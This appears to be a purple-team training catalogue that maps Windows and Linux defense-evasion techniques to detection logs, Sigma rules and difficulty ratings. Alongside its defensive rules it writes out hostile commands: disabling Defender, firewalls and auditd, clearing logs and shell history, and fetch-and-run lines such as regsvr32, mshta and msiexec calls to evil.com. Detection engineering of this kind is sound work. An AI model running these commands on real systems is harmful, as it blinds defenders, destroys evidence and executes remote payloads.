# CIPHER Defense Evasion & Detection Catalog

> **[MODE: PURPLE]** — Comprehensive mapping of evasion techniques to detection methods.
> Generated: 2026-03-14 | MITRE ATT&CK v15 aligned | CIPHER Training Material
>
> Detection Difficulty Scale:
> - **Easy** — Native log sources, well-known signatures, low false-positive rate
> - **Medium** — Requires tuned rules, correlation, or non-default log sources
> - **Hard** — Requires advanced telemetry (EDR, kernel callbacks, memory scanning)
> - **Very Hard** — Minimal observable artifacts; requires behavioral/heuristic detection or custom instrumentation

---

## Table of Contents

1. [Impair Defenses](#1-impair-defenses)
2. [Indicator Removal](#2-indicator-removal)
3. [Process Injection](#3-process-injection)
4. [Obfuscated Files or Information](#4-obfuscated-files-or-information)
5. [System Binary Proxy Execution](#5-system-binary-proxy-execution)
6. [Access Token Manipulation](#6-access-token-manipulation)
7. [Abuse Elevation Control Mechanism](#7-abuse-elevation-control-mechanism)
8. [Masquerading](#8-masquerading)
9. [Subvert Trust Controls](#9-subvert-trust-controls)
10. [Hijack Execution Flow](#10-hijack-execution-flow)
11. [Hide Artifacts](#11-hide-artifacts)
12. [Modify Authentication Process](#12-modify-authentication-process)
13. [Rootkits & Pre-OS Boot](#13-rootkits--pre-os-boot)
14. [Reflective Code Loading](#14-reflective-code-loading)
15. [Indirect Command Execution](#15-indirect-command-execution)
16. [Domain & Tenant Policy Modification](#16-domain--tenant-policy-modification)
17. [NTLM Coercion & Auth Evasion](#17-ntlm-coercion--auth-evasion)
18. [AV/EDR Bypass Tooling](#18-avedr-bypass-tooling)
19. [Network & Traffic Evasion](#19-network--traffic-evasion)
20. [Anti-Analysis Techniques](#20-anti-analysis-techniques)
21. [Cloud Defense Evasion](#21-cloud-defense-evasion)
22. [Linux-Specific Evasion](#22-linux-specific-evasion)

---

## 1. Impair Defenses

### 1.1 Disable or Modify Tools (T1562.001)

**Technique:** Kill, uninstall, or tamper with security tools (AV, EDR, Sysmon) via service stops, driver unloads, or process termination.

**Implementations:**
- Manual service stop: `sc stop WinDefend`, `Set-MpPreference -DisableRealtimeMonitoring $true`
- Driver-based: load vulnerable driver to kill EDR process (BYOVD — Bring Your Own Vulnerable Driver)
- Empire C2: built-in modules for disabling AV/endpoint tools
- SharpBlock: blocks EDR DLL entry point execution, preventing hooks from being placed

**Detection:**
| Log Source | Event/Indicator | Sigma Pattern |
|---|---|---|
| Windows Security | Event ID 4689 (process termination of security tool) | `selection: TargetImage\|endswith: '\MsMpEng.exe'` |
| Sysmon | Event ID 1 — `sc.exe stop` targeting security services | `CommandLine\|contains\|all: ['sc', 'stop', 'WinDefend']` |
| System Log | Event ID 7036 — service state change | `param1: 'Windows Defender Antivirus Service'` and `param2: 'stopped'` |
| WMI/PowerShell | ScriptBlock logging — `Set-MpPreference` with disable flags | `ScriptBlockText\|contains: 'DisableRealtimeMonitoring'` |
| EDR Telemetry | Driver load of known vulnerable driver (BYOVD) | Cross-reference driver hash against LOLDrivers project |

**Detection Difficulty:** Medium

---

### 1.2 Disable Windows Event Logging (T1562.002)

**Technique:** Disable or impair the Windows Event Log service to prevent security event collection. The service appears running but produces no logs.

**Implementations:**
- **Invoke-Phant0m** — Kills Event Log service threads (not the process) using two methods: (1) NtQueryInformationThread to read TEB SubProcessTag and match service tags; (2) Identify threads loading `wevtsvc.dll`. The service appears running but is non-functional.
- **Ghost-In-The-Logs** — Kernel-level evasion using KDU (kernel driver utility) and InfinityHook to intercept ETW/Event Log at the kernel level. Requires high-integrity admin.
- `auditpol /set /subcategory:"..." /success:disable /failure:disable`
- Registry: `HKLM\SYSTEM\CurrentControlSet\Services\EventLog` manipulation

**Detection:**
| Log Source | Event/Indicator | Sigma Pattern |
|---|---|---|
| Sysmon | Event ID 1 — process creating Phant0m or calling NtQueryInformationThread in loop | `Image\|endswith: '\Phant0m.exe'` or behavioral: rapid thread enumeration of svchost |
| Canary Events | Absence of expected heartbeat events (Event ID 1102 gap detection) | Monitor for log gaps >N minutes in Security/System channels |
| Sysmon | Event ID 7 — driver load (Ghost-In-The-Logs uses kernel driver) | `ImageLoaded\|contains: 'KDU'` or unsigned driver load |
| Windows Security | Event ID 4719 — audit policy change | `SubcategoryGuid` values for disabled subcategories |
| EDR | Thread termination targeting svchost.exe hosting EventLog service | Monitor TerminateThread calls on PID hosting eventlog |

**Detection Difficulty:** Hard — Phant0m leaves the service process alive; Ghost-In-The-Logs operates at kernel level.

**CRITICAL NOTE:** If event logging is disabled, detection must rely on external log forwarding (Sysmon -> SIEM before kill), network-based detection, or EDR kernel callbacks that operate independently of ETW.

---

### 1.3 Indicator Blocking / ETW Patching (T1562.006)

**Technique:** Patch ETW (Event Tracing for Windows) provider functions in memory to prevent telemetry generation at the source. This blinds all ETW consumers including Defender, Sysmon, and EDR.

**Implementations:**
- `ntdll!EtwEventWrite` patching (write `ret` instruction at function entry)
- SharpBlock: "patchless ETW bypass" — blocks without modifying ETW code (avoids memory integrity checks)
- SharpUnhooker: includes ETW patcher module
- Empire C2: customizable ETW bypass modules
- BypassAV mindmap: ScareCrow, BlockEtw, SharpBlock for automated ETW disable

**Detection:**
| Log Source | Event/Indicator | Sigma Pattern |
|---|---|---|
| EDR (kernel callbacks) | Modification of `ntdll.dll` .text section in process memory | Memory integrity check: compare in-memory ntdll against on-disk copy |
| Sysmon | Event ID 7 — unusual DLL loads preceding ETW silence | Behavioral: process loads ntdll then stops generating ETW events |
| Hardware Performance Counters | Unexpected `ret` at EtwEventWrite entry point | Custom: periodic function prologue verification |
| Canary Events | ETW session drops or provider deregistration | Monitor ETW session status via `logman query -ets` |

**Detection Difficulty:** Very Hard — Patchless techniques like SharpBlock leave no memory modification artifacts.

---

### 1.4 AMSI Bypass (T1562.001 / T1059.001)

**Technique:** Disable or bypass the Antimalware Scan Interface to execute malicious PowerShell, .NET, VBScript, or JavaScript without content inspection.

**Implementations (from Amsi-Bypass-Powershell collection):**
1. **AmsiScanBuffer patching in clr.dll** — Scan process memory for "AmsiScanBuffer" signature, overwrite with null bytes
2. **Reflection-based ScanContent modification** — .NET reflection to modify AMSI internal `ScanContent` property
3. **Hardware breakpoints** — CPU debug registers to break on AMSI functions, redirect execution
4. **CLR hooking** — Intercept CLR calls before AMSI processing
5. **MpOav.dll provider patching** — Modify Microsoft's AMSI provider DLL
6. **AmsiOpenSession patching** — Prevent AMSI session initialization
7. **PowerShell v2 downgrade** — Use PowerShell 2.0 which lacks AMSI entirely (T1562.010)
8. **ScriptBlock smuggling** — Obfuscate script blocks to evade AMSI scanning
9. **Script logging disablement** — Disable PowerShell ScriptBlock logging
- SharpBlock: "patchless AMSI bypass undetectable from scanners looking for Amsi.dll code patches"
- SharpUnhooker: includes AMSI patcher
- Empire C2: integrated AMSI bypass

**Detection:**
| Log Source | Event/Indicator | Sigma Pattern |
|---|---|---|
| PowerShell | Event ID 4104 — ScriptBlock containing AMSI bypass strings (pre-bypass) | `ScriptBlockText\|contains\|any: ['AmsiScanBuffer', 'AmsiUtils', 'amsiInitFailed', 'SetValue', 'NonPublic']` |
| Sysmon | Event ID 10 — Process access to amsi.dll memory (WriteProcessMemory) | `TargetImage\|endswith: '\amsi.dll'` with `GrantedAccess: 0x1F0FFF` |
| .NET ETW | CLR loading events showing AMSI provider deregistration | Monitor `Microsoft-Antimalware-Scan-Interface` ETW provider for gaps |
| Windows Security | Event ID 4688 — PowerShell v2 invocation | `CommandLine\|contains: '-version 2'` or `NewProcessName\|endswith: '\powershell.exe'` with v2 indicators |
| EDR | Memory page permission changes on amsi.dll | VirtualProtect on amsi.dll .text section |

**Detection Difficulty:** Medium (classic patching) to Very Hard (patchless/hardware breakpoint methods)

---

### 1.5 Disable or Modify System Firewall (T1562.004)

**Technique:** Disable host-based firewalls to enable unrestricted network communication.

**Implementation:** `netsh advfirewall set allprofiles state off`, `Set-NetFirewallProfile -Enabled False`

**Detection:**
| Log Source | Event/Indicator | Sigma Pattern |
|---|---|---|
| Windows Firewall | Event ID 2003 — firewall profile state change | `SettingValue: 0` (off) |
| Sysmon | Event ID 1 — netsh or PowerShell with firewall disable args | `CommandLine\|contains\|all: ['netsh', 'advfirewall', 'off']` |

**Detection Difficulty:** Easy

---

### 1.6 Safe Mode Boot (T1562.009)

**Technique:** Boot Windows in Safe Mode to disable third-party security tools that are not configured to run in Safe Mode.

**Implementation:** `bcdedit /set {current} safeboot minimal`, then force reboot.

**Detection:**
| Log Source | Event/Indicator | Sigma Pattern |
|---|---|---|
| Sysmon | Event ID 1 — bcdedit.exe with safeboot arguments | `CommandLine\|contains\|all: ['bcdedit', 'safeboot']` |
| Windows System | Event ID 12 — Registry modification of BCD | `TargetObject\|contains: 'safeboot'` |

**Detection Difficulty:** Easy

---

### 1.7 Downgrade Attack (T1562.010)

**Technique:** Force use of older, less-secure protocol or feature versions that lack modern security controls.

**Implementation:** PowerShell v2 downgrade (no AMSI/ScriptBlock logging), TLS downgrade, NTLM downgrade.

**Detection:**
| Log Source | Event/Indicator | Sigma Pattern |
|---|---|---|
| PowerShell | Event ID 400 — Engine version 2.0 start | `EngineVersion: '2.0'` |
| Sysmon | Event ID 1 — powershell.exe with `-version 2` flag | `CommandLine\|contains: '-version 2'` |

**Detection Difficulty:** Easy

---

### 1.8 Disable or Modify Linux Audit System (T1562.012)

**Technique:** Disable auditd, modify audit rules, or kill the audit daemon to prevent logging on Linux.

**Implementation:** `systemctl stop auditd`, `auditctl -D` (delete all rules), `kill -9 $(pidof auditd)`

**Detection:**
| Log Source | Event/Indicator | Sigma Pattern |
|---|---|---|
| auditd (if forwarded before kill) | AUDIT_DAEMON_END event | `type: DAEMON_END` |
| systemd journal | Unit state change for auditd.service | `unit: 'auditd.service'` and `MESSAGE\|contains: 'Stopped'` |
| Host-based agent | Process termination of auditd PID | Custom: auditd heartbeat monitoring |

**Detection Difficulty:** Medium — requires log forwarding before the kill

---

## 2. Indicator Removal

### 2.1 Clear Windows Event Logs (T1070.001)

**Technique:** Clear Security, System, or Application event logs to destroy evidence.

**Implementation:** `wevtutil cl Security`, `Clear-EventLog -LogName Security`, `[System.Diagnostics.Eventing.Reader.EventLogSession]::GlobalSession.ClearLog("Security")`

**Detection:**
| Log Source | Event/Indicator | Sigma Pattern |
|---|---|---|
| Windows Security | Event ID 1102 — The audit log was cleared | Always alert on 1102 |
| Windows System | Event ID 104 — Event log cleared | Always alert on 104 |
| Sysmon | Event ID 1 — wevtutil.exe with `cl` argument | `CommandLine\|contains\|all: ['wevtutil', 'cl']` |

**Detection Difficulty:** Easy — log clearing itself generates a final event.

---

### 2.2 Clear Linux/Mac System Logs (T1070.002)

**Technique:** Delete or truncate system log files.

**Implementation:** `> /var/log/auth.log`, `rm -rf /var/log/syslog`, `shred -u /var/log/secure`

**Detection:**
| Log Source | Event/Indicator | Sigma Pattern |
|---|---|---|
| auditd | SYSCALL events for unlink/truncate on /var/log/* | `path\|startswith: '/var/log/'` and `syscall: 'unlink'` |
| File integrity monitoring | FIM alert on /var/log/* modification | OSSEC/Wazuh: `<directories check_all="yes">/var/log</directories>` |
| Remote syslog | Log gap detection | Heartbeat-based monitoring from remote collector |

**Detection Difficulty:** Medium

---

### 2.3 Clear Command History (T1070.003)

**Technique:** Clear shell history files to remove evidence of executed commands.

**Implementation:** `history -c`, `rm ~/.bash_history`, `export HISTSIZE=0`, `unset HISTFILE`, `Set-PSReadLineOption -HistorySaveStyle SaveNothing`

**Detection:**
| Log Source | Event/Indicator | Sigma Pattern |
|---|---|---|
| auditd | SYSCALL for unlink on `.bash_history`, `.zsh_history` | `path\|endswith: '_history'` |
| Sysmon (Linux) | File deletion targeting history files | `TargetFilename\|endswith: '_history'` |
| PowerShell | ScriptBlock logging — Set-PSReadLineOption | `ScriptBlockText\|contains: 'HistorySaveStyle'` |

**Detection Difficulty:** Easy

---

### 2.4 File Deletion (T1070.004)

**Technique:** Delete malware, tools, or other artifacts after use.

**Implementation:** `del /f malware.exe`, `SDelete`, `cipher /w:C:\`, `shred`, `rm -P`

**Detection:**
| Log Source | Event/Indicator | Sigma Pattern |
|---|---|---|
| Sysmon | Event ID 23 — FileDelete (archived) or Event ID 26 | Correlate with prior Event ID 11 (FileCreate) for same path |
| MFT Analysis | $MFT record with $FILE_NAME showing deleted file | Forensic: parse $MFT for recently deleted entries |

**Detection Difficulty:** Medium — depends on Sysmon FileDelete configuration

---

### 2.5 Timestomping (T1070.006)

**Technique:** Modify file timestamps ($STANDARD_INFORMATION) to blend malicious files with legitimate OS files.

**Implementation:** `timestomp.exe`, PowerShell `(Get-Item file.exe).LastWriteTime = '01/01/2020'`, `touch -t` (Linux)

**Detection:**
| Log Source | Event/Indicator | Sigma Pattern |
|---|---|---|
| Sysmon | Event ID 2 — FileCreationTime changed | `TargetFilename` where new time predates process creation |
| NTFS Forensics | $SI vs $FN timestamp discrepancy | $STANDARD_INFORMATION.Modified != $FILE_NAME.Modified (MFT analysis) |

**Detection Difficulty:** Medium — requires NTFS-aware analysis or Sysmon Event ID 2

---

## 3. Process Injection

### 3.1 DLL Injection (T1055.001)

**Technique:** Inject a malicious DLL into a running process using OpenProcess -> VirtualAllocEx -> WriteProcessMemory -> CreateRemoteThread.

**Implementation:** Custom C/C++ injectors, Empire process injection modules, Cobalt Strike `inject` command

**Detection:**
| Log Source | Event/Indicator | Sigma Pattern |
|---|---|---|
| Sysmon | Event ID 8 — CreateRemoteThread | `SourceImage` != `TargetImage` (cross-process thread creation) |
| Sysmon | Event ID 10 — ProcessAccess with PROCESS_ALL_ACCESS | `GrantedAccess: '0x1F0FFF'` or `'0x1FFFFF'` |
| Sysmon | Event ID 7 — ImageLoaded (unexpected DLL in target process) | DLL loaded from unusual path (e.g., `%TEMP%`, `%APPDATA%`) |
| ETW | Microsoft-Windows-Kernel-Process provider | VirtualAlloc with PAGE_EXECUTE_READWRITE in remote process |

**Detection Difficulty:** Medium

---

### 3.2 Process Hollowing (T1055.012)

**Technique:** Create a legitimate process in suspended state, unmap its memory, write malicious code, then resume. The process appears legitimate in task manager.

**Implementation:** Custom tooling, SharpBlock (includes hollow detection bypass), Cobalt Strike `spawn` with process hollowing

**Detection:**
| Log Source | Event/Indicator | Sigma Pattern |
|---|---|---|
| Sysmon | Event ID 1 — Process with CREATE_SUSPENDED flag | Correlate: process created then immediate memory writes |
| ETW | NtUnmapViewOfSection call after process creation | Behavioral: unmapping primary module of newly created process |
| Sysmon | Event ID 10 — ProcessAccess from parent with write permissions | `GrantedAccess\|contains: '0x20'` (PROCESS_VM_WRITE) |
| Memory scanning | Mismatch between on-disk image and in-memory image | EDR: PEB image base vs actual mapped image comparison |

**Detection Difficulty:** Hard — SharpBlock specifically includes hollow detection bypass

---

### 3.3 APC Injection (T1055.004)

**Technique:** Queue an Asynchronous Procedure Call to a thread, which executes the injected code when the thread enters an alertable state.

**Implementation:** QueueUserAPC, NtQueueApcThread, early-bird injection (queue before thread resumes)

**Detection:**
| Log Source | Event/Indicator | Sigma Pattern |
|---|---|---|
| ETW | Thread creation followed by APC queue | Kernel-mode ETW: NtQueueApcThread calls from usermode |
| Sysmon | Event ID 10 — cross-process access with thread-level permissions | `GrantedAccess` including THREAD_SET_CONTEXT |
| EDR | Syscall tracing for NtQueueApcThread | Stack trace analysis: calling module legitimacy |

**Detection Difficulty:** Hard

---

### 3.4 Thread Execution Hijacking (T1055.003)

**Technique:** Suspend a thread, modify its instruction pointer (EIP/RIP) to point to injected code, then resume.

**Implementation:** SuspendThread -> GetThreadContext -> SetThreadContext -> ResumeThread

**Detection:**
| Log Source | Event/Indicator | Sigma Pattern |
|---|---|---|
| ETW | SetThreadContext calls from external process | Cross-process SetThreadContext is highly suspicious |
| EDR | Thread context modification detection | Monitor Get/SetThreadContext pairs from different process |

**Detection Difficulty:** Hard

---

### 3.5 Process Doppelganging (T1055.013)

**Technique:** Abuse Windows NTFS transactions to create a process from a transacted file that is never committed to disk, leaving no file artifact.

**Implementation:** NtCreateTransaction -> write malicious file -> NtCreateSection -> NtRollbackTransaction -> NtCreateProcessEx

**Detection:**
| Log Source | Event/Indicator | Sigma Pattern |
|---|---|---|
| ETW | TxF (transactional NTFS) API usage | NtCreateTransaction followed by NtCreateSection in same context |
| Sysmon | Event ID 1 — process with no backing file on disk | Process image path does not exist on filesystem |
| Memory forensics | Process with Section object not backed by file | Volatility: compare _EPROCESS ImageFileName with on-disk files |

**Detection Difficulty:** Very Hard

---

### 3.6 Ptrace Injection (T1055.008)

**Technique:** Use ptrace() syscall on Linux to attach to a process and inject shellcode.

**Implementation:** `ptrace(PTRACE_ATTACH, pid, ...)` -> write shellcode to RWX region -> modify RIP

**Detection:**
| Log Source | Event/Indicator | Sigma Pattern |
|---|---|---|
| auditd | SYSCALL for ptrace with PTRACE_ATTACH or PTRACE_POKETEXT | `syscall: 101` and `a0: 16` (PTRACE_ATTACH) |
| /proc | /proc/sys/kernel/yama/ptrace_scope setting | Hardening: set to 1 or higher |
| AppArmor/SELinux | Policy violation for ptrace capability | `deny ptrace` in AppArmor profile |

**Detection Difficulty:** Medium (with auditd), Hard (without)

---

### 3.7 Reflective DLL Injection (T1620 / T1055.001)

**Technique:** Load a DLL entirely from memory without touching disk, using a custom reflective loader that resolves imports and relocations manually.

**Implementation:** ReflectiveLoader (Stephen Fewer), Cobalt Strike reflective DLL, SharpUnhooker (DLL form)

**Detection:**
| Log Source | Event/Indicator | Sigma Pattern |
|---|---|---|
| Sysmon | Event ID 7 — ImageLoaded with no valid file path | `ImageLoaded` is empty or points to non-existent file |
| ETW | Private memory region with RX permissions containing PE header | Scan for MZ/PE signatures in private (non-image) memory |
| EDR | Unbacked executable memory regions | Memory scanning: executable pages not backed by a file |

**Detection Difficulty:** Hard

---

## 4. Obfuscated Files or Information

### 4.1 Software Packing (T1027.002)

**Technique:** Compress or encrypt executables so that static signatures cannot match the payload.

**Implementation:** UPX, Themida, VMProtect, custom packers, Hyperion (encryption), ConfuserEx (.NET)

**Detection:**
| Log Source | Event/Indicator | Sigma Pattern |
|---|---|---|
| Static Analysis | High entropy sections in PE file | Entropy > 7.0 in .text section |
| Sysmon | Event ID 7 — loaded image with packer signatures | YARA: `rule packed { condition: pe.section[0].entropy > 7.0 }` |
| Sandbox | Unpacking behavior: VirtualAlloc -> write -> execute | Dynamic: memory allocation followed by execution |

**Detection Difficulty:** Medium (known packers), Hard (custom packers)

---

### 4.2 Command Obfuscation (T1027.010)

**Technique:** Obfuscate command-line arguments using encoding, variable substitution, caret insertion, string concatenation.

**Implementation:** `^p^o^w^e^r^s^h^e^l^l`, `cmd /c "set x=pow&&set y=ershell&&%x%%y%"`, Invoke-Obfuscation, DOSfuscation

**Detection:**
| Log Source | Event/Indicator | Sigma Pattern |
|---|---|---|
| Sysmon | Event ID 1 — CommandLine with excessive special characters | `CommandLine\|re: '(\^.){4,}'` (caret obfuscation) |
| PowerShell | Event ID 4104 — deobfuscated ScriptBlock | ScriptBlock logging captures the deobfuscated version |
| Sigma | General obfuscation patterns | `CommandLine\|contains\|any: ['char[', 'join', 'replace', '-bxor', '-split']` |

**Detection Difficulty:** Medium — PowerShell ScriptBlock logging defeats most PS obfuscation

---

### 4.3 HTML Smuggling (T1027.006)

**Technique:** Construct malicious payloads client-side using JavaScript blobs, bypassing network inspection.

**Implementation:** JavaScript Blob + createObjectURL, data URIs, ScareCrow payload delivery

**Detection:**
| Log Source | Event/Indicator | Sigma Pattern |
|---|---|---|
| Proxy/Web Gateway | Unusual file downloads from JavaScript-constructed URLs | Content-Type mismatch analysis |
| Sysmon | Event ID 11 — file created in browser download directory from HTML page | FileCreate in Downloads from browser process with unusual extension |
| Email Gateway | HTML attachment with embedded JavaScript Blob construction | Scan for `new Blob`, `createObjectURL` in HTML attachments |

**Detection Difficulty:** Medium

---

### 4.4 Dynamic API Resolution (T1027.007)

**Technique:** Resolve Windows API functions at runtime using GetProcAddress or hash-based resolution to avoid static import table analysis.

**Implementation:** API hashing (djb2, CRC32, ROR13), GetProcAddress chains, DInvoke (.NET P/Invoke alternative)

**Detection:**
| Log Source | Event/Indicator | Sigma Pattern |
|---|---|---|
| Static Analysis | Missing or minimal import table in PE | IAT with < 10 entries is suspicious for complex binaries |
| ETW | Kernel32!GetProcAddress called repeatedly from non-standard module | High-frequency GetProcAddress from unbacked memory |
| Sandbox | Dynamic resolution of sensitive APIs (VirtualAlloc, CreateRemoteThread) | Behavioral: API call sequences matching injection patterns |

**Detection Difficulty:** Hard

---

### 4.5 Fileless Storage (T1027.011)

**Technique:** Store payloads in registry, WMI repository, event logs, or ADS rather than filesystem files.

**Implementation:** Registry Run keys with encoded payloads, WMI event subscriptions, `certutil -encode` to registry

**Detection:**
| Log Source | Event/Indicator | Sigma Pattern |
|---|---|---|
| Sysmon | Event ID 13 — Registry value set with large/encoded data | `Details` length > 500 characters in Run/RunOnce keys |
| Sysmon | Event ID 20/21 — WMI event consumer/filter creation | `EventType: 'WmiFilterEvent'` |
| EDR | Registry values containing Base64 or encoded PE headers | YARA scan of registry hives for encoded executables |

**Detection Difficulty:** Hard

---

### 4.6 Polymorphic Code (T1027.014)

**Technique:** Code that mutates its own binary representation on each execution while maintaining identical functionality.

**Implementation:** Metamorphic engines, Shikata Ga Nai (msfvenom encoder), custom polymorphic shellcode generators

**Detection:**
| Log Source | Event/Indicator | Sigma Pattern |
|---|---|---|
| Sandbox | Behavioral analysis: same functionality, different hashes | Behavioral signatures rather than hash/byte matching |
| EDR | Heuristic/ML detection of obfuscated shellcode patterns | Statistical analysis of code section entropy and structure |
| Memory scanning | Decrypted shellcode in memory post-execution | Scan for known shellcode stubs after decryption |

**Detection Difficulty:** Very Hard for static detection; Medium for behavioral/sandbox

---

### 4.7 Steganography (T1027.003)

**Technique:** Hide payloads within image files, audio, video, or other media.

**Implementation:** Invoke-PSImage (PowerShell in PNG), LSB steganography, IDAT chunk abuse

**Detection:**
| Log Source | Event/Indicator | Sigma Pattern |
|---|---|---|
| Network | Unusually large image downloads followed by script execution | Image file size anomaly for given dimensions |
| Sysmon | Event ID 1 — script interpreters reading image files | `CommandLine\|contains: '.png'` or `.bmp` in PowerShell context |
| Static Analysis | Statistical analysis (chi-square) on image data | LSB analysis tools: detect non-random LSB distribution |

**Detection Difficulty:** Very Hard

---

### 4.8 Direct Syscalls & Indirect Syscalls (T1106 / T1027.007)

**Technique:** Bypass usermode API hooks by invoking syscall instructions directly (or indirectly via `jmp` to ntdll syscall stub) instead of calling ntdll functions.

**Implementation:**
- **SysWhispers/SysWhispers2/SysWhispers3** — Generate direct syscall stubs
- **Freeze** — Indirect syscall framework
- **PEzor** — Shellcode loader with indirect syscall support
- **SharpUnhooker** — Unhook ntdll/kernel32/advapi32/kernelbase by refreshing DLLs
- **DInvoke** — .NET dynamic invocation bypassing P/Invoke hooks

**Detection:**
| Log Source | Event/Indicator | Sigma Pattern |
|---|---|---|
| EDR (kernel callbacks) | Syscall origin not from ntdll.dll address range | Stack trace: return address outside ntdll for NT* syscalls |
| ETW-TI | Kernel telemetry for sensitive syscalls (NtAllocateVirtualMemory with RWX) | Threat Intelligence ETW channel (requires PPL) |
| Memory scanning | Syscall stub patterns (mov r10, rcx; mov eax, SSN; syscall) in non-ntdll memory | YARA: `{ 4C 8B D1 B8 ?? ?? 00 00 0F 05 }` in private memory |

**Detection Difficulty:** Very Hard — Indirect syscalls (jumping into legitimate ntdll code) are nearly undetectable without kernel-level telemetry.

---

## 5. System Binary Proxy Execution

### 5.1 Rundll32 (T1218.011)

**Technique:** Execute malicious DLL payloads via the trusted rundll32.exe binary.

**Implementation:** `rundll32.exe malicious.dll,EntryPoint`, `rundll32.exe javascript:"\..\mshtml,RunHTMLApplication..."`

**Detection:**
| Log Source | Event/Indicator | Sigma Pattern |
|---|---|---|
| Sysmon | Event ID 1 — rundll32.exe with unusual DLL path or JavaScript | `Image\|endswith: '\rundll32.exe'` and `CommandLine\|contains: 'javascript'` |
| Sysmon | Event ID 1 — rundll32.exe spawning child processes | Unusual child processes from rundll32 |

**Detection Difficulty:** Easy to Medium

---

### 5.2 Regsvr32 (T1218.010)

**Technique:** Use regsvr32.exe to execute COM scriptlets (.sct) from local or remote sources, bypassing AppLocker.

**Implementation:** `regsvr32 /s /n /u /i:http://evil.com/payload.sct scrobj.dll` (Squiblydoo)

**Detection:**
| Log Source | Event/Indicator | Sigma Pattern |
|---|---|---|
| Sysmon | Event ID 1 — regsvr32.exe with `/i:http` argument | `CommandLine\|contains\|all: ['regsvr32', '/i:http']` |
| Sysmon | Event ID 3 — regsvr32.exe making network connections | `Image\|endswith: '\regsvr32.exe'` with outbound network |

**Detection Difficulty:** Easy

---

### 5.3 Mshta (T1218.005)

**Technique:** Execute malicious HTA files or inline VBScript/JScript via mshta.exe.

**Implementation:** `mshta http://evil.com/payload.hta`, `mshta vbscript:Execute("...")`

**Detection:**
| Log Source | Event/Indicator | Sigma Pattern |
|---|---|---|
| Sysmon | Event ID 1 — mshta.exe with URL or inline script | `Image\|endswith: '\mshta.exe'` and `CommandLine\|contains\|any: ['http', 'vbscript', 'javascript']` |
| Sysmon | Event ID 1 — mshta.exe spawning cmd/powershell | Child process of mshta is suspicious |

**Detection Difficulty:** Easy

---

### 5.4 CMSTP (T1218.003)

**Technique:** Use CMSTP.exe to execute malicious INF files, bypassing AppLocker and UAC.

**Implementation:** `cmstp.exe /ni /s malicious.inf` with COM object registration

**Detection:**
| Log Source | Event/Indicator | Sigma Pattern |
|---|---|---|
| Sysmon | Event ID 1 — cmstp.exe with /ni or /s flags | `Image\|endswith: '\cmstp.exe'` |
| Sysmon | Event ID 12/13 — CMSTP registry modifications | `TargetObject\|contains: 'CMSTP'` |

**Detection Difficulty:** Easy

---

### 5.5 Msiexec (T1218.007)

**Technique:** Execute malicious MSI packages via msiexec.exe, including remote payloads.

**Implementation:** `msiexec /q /i http://evil.com/payload.msi`

**Detection:**
| Log Source | Event/Indicator | Sigma Pattern |
|---|---|---|
| Sysmon | Event ID 1 — msiexec.exe with remote URL | `CommandLine\|contains\|all: ['msiexec', 'http']` |
| Windows Installer | Event ID 1033/1034 — MSI install/uninstall events | Unexpected MSI installation from temp/download directories |

**Detection Difficulty:** Easy

---

### 5.6 InstallUtil / Regsvcs / Regasm (T1218.004 / T1218.009)

**Technique:** Abuse .NET framework utilities to execute code through installer components or COM registration.

**Implementation:** `InstallUtil.exe /logfile= /LogToConsole=false /U malicious.dll`

**Detection:**
| Log Source | Event/Indicator | Sigma Pattern |
|---|---|---|
| Sysmon | Event ID 1 — InstallUtil/Regsvcs/Regasm execution from unusual path | `Image\|endswith\|any: ['\InstallUtil.exe', '\Regsvcs.exe', '\Regasm.exe']` |
| .NET ETW | Assembly load events from unusual locations | CLR module load from %TEMP% or user-writable paths |

**Detection Difficulty:** Easy

---

### 5.7 Mavinject (T1218.013)

**Technique:** Use mavinject.exe (signed Microsoft binary) to inject DLLs into running processes.

**Implementation:** `mavinject.exe <PID> /INJECTRUNNING malicious.dll`

**Detection:**
| Log Source | Event/Indicator | Sigma Pattern |
|---|---|---|
| Sysmon | Event ID 1 — mavinject.exe with /INJECTRUNNING | `Image\|endswith: '\mavinject.exe'` |
| Sysmon | Event ID 8 — CreateRemoteThread from mavinject | Cross-process thread creation from mavinject |

**Detection Difficulty:** Easy

---

### 5.8 Compiled HTML (T1218.001)

**Technique:** Execute code via compiled HTML help files (.chm) using hh.exe.

**Implementation:** Malicious .chm file with embedded ActiveX/script objects

**Detection:**
| Log Source | Event/Indicator | Sigma Pattern |
|---|---|---|
| Sysmon | Event ID 1 — hh.exe spawning child processes | `ParentImage\|endswith: '\hh.exe'` with child cmd/powershell |

**Detection Difficulty:** Easy

---

## 6. Access Token Manipulation

### 6.1 Token Impersonation/Theft (T1134.001)

**Technique:** Duplicate tokens from other processes to assume their security context.

**Implementation:** `Invoke-TokenManipulation`, Cobalt Strike `steal_token`, Mimikatz `token::elevate`, RunasCs with `--remote-impersonation`

**Detection:**
| Log Source | Event/Indicator | Sigma Pattern |
|---|---|---|
| Windows Security | Event ID 4624 — Logon Type 9 (NewCredentials) | `LogonType: 9` from unexpected processes |
| Windows Security | Event ID 4672 — Special privileges assigned | Privileges assigned to non-admin accounts |
| Sysmon | Event ID 10 — ProcessAccess for token duplication | `GrantedAccess` with TOKEN_DUPLICATE (0x0002) |

**Detection Difficulty:** Medium

---

### 6.2 Parent PID Spoofing (T1134.004)

**Technique:** Create processes with a spoofed parent PID to evade process-tree analysis and inherit a different security context.

**Implementation:** PROC_THREAD_ATTRIBUTE_PARENT_PROCESS in UpdateProcThreadAttribute, SharpBlock (implicit via process creation)

**Detection:**
| Log Source | Event/Indicator | Sigma Pattern |
|---|---|---|
| Sysmon | Event ID 1 — ParentProcessId mismatch with actual creator | ETW: compare CreatingProcessId (kernel) with ParentProcessId (reported) |
| EDR | Kernel callback for process creation showing true parent | Real parent != declared parent in process creation notification |

**Detection Difficulty:** Hard — requires kernel-level telemetry to detect the true parent

---

### 6.3 SID-History Injection (T1134.005)

**Technique:** Inject SID-History attribute into AD user object to gain privileges of another account without group membership.

**Implementation:** Mimikatz `sid::patch` + `sid::add`, DSInternals

**Detection:**
| Log Source | Event/Indicator | Sigma Pattern |
|---|---|---|
| Windows Security | Event ID 4765/4766 — SID History added | Always alert: SID History modification is rare in production |
| AD Replication | DCShadow detection — rogue DC replication | Monitor for unexpected domain controller registration |
| PowerShell | AD attribute query for SIDHistory != null | Periodic sweep: `Get-ADUser -Filter * -Properties SIDHistory` |

**Detection Difficulty:** Medium — the events exist but are rarely monitored

---

## 7. Abuse Elevation Control Mechanism

### 7.1 UAC Bypass (T1548.002)

**Technique:** Bypass Windows User Account Control to elevate privileges without prompting the user.

